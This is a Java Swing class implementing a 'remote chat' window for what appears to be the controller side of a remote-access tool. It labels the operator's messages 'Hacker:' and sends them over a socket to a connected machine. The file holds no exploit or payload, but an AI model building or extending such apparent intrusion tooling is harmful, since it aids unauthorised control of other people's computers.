package me.server.receive;

import com.sun.jna.platform.WindowUtils;
import me.server.Server;
import me.server.utils.MessageFlags;
import me.server.utils.SendMessage;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;

public class RemoteChat extends Thread{
    Socket socket;
    JTextArea jta;
    InputStream icon = Server.class.getClassLoader().getResourceAsStream("me/resources/8.png");
    Image icons = ImageIO.read(icon);
    public RemoteChat(Socket socket,String IP) throws IOException {
        this.socket = socket;
        System.setProperty("sun.java2d.noddraw", "true");
        JDialog jWindow = new JDialog();
        WindowUtils.setWindowAlpha(jWindow,0.8f);
        jWindow.setIconImage(icons);
        jWindow.setTitle("\\\\" + IP + "-" + "远程聊天");
        jta=new JTextArea();
        jta.setEditable(false);
        jta.setBackground(Color.BLACK);
        jta.setForeground(Color.green);
        JScrollPane jsp=new JScrollPane(jta);
        JPanel jp=new JPanel();
        JTextField jtf=new JTextField(20);
        JButton jb=new JButton("发送");
        jb.setBackground(new Color(0, 250, 0));
        jp.add(jtf);
        jp.add(jb);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        jta.setFont(font);
        jtf.setFont(font);
        jWindow.add(jsp,BorderLayout.CENTER);
        jWindow.add(jp,BorderLayout.SOUTH);
        jWindow.setSize(500,300);
        jWindow.setLocationRelativeTo(null);
        jWindow.setVisible(true);
        jb.addActionListener(a->{
            try {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy:MM:dd  hh:mm:ss");
                Date date = new Date();
                dateFormat.format(date);
                jta.append(date + "\n");
                String chat = date + "\n"+ "Hacker: " + jtf.getText() + "\n";
                jta.append("我: " + jtf.getText() + "\n");
                jtf.setText("");
                SendMessage.Send(MessageFlags.SEND_REMOTECHAT,chat.getBytes(StandardCharsets.UTF_8),socket);
            }catch (Exception e) {
            }
        });
        jWindow.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                SendMessage.SendHead(MessageFlags.STOP_REMOTECHAT,socket);
            }
        });
    }
    public void update(byte[] bytes) {
        jta.append(new String(bytes));
    }
}

